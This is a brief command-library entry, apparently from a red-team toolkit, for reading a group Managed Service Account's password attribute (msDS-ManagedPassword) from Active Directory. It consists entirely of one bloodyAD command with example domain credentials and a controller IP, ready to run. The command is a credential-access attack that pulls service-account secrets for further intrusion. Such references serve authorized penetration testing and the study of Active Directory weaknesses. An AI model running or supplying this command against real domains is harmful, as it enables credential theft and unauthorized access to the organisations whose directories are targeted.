---
id: e82d72ec-dfea-4946-aaa2-272c4f533ea4
name: Get Object Attributes for GMSA Account
type: command
executor: bash
data: python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2
  getObjectAttributes gmsaAccount$ msDS-ManagedPassword
output: null
created_at: '2023-04-06T03:56:06.961835+00:00'
updated_at: '2023-04-10T20:26:00.828959+00:00'
---

# Get Object Attributes for GMSA Account

```bash
python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```
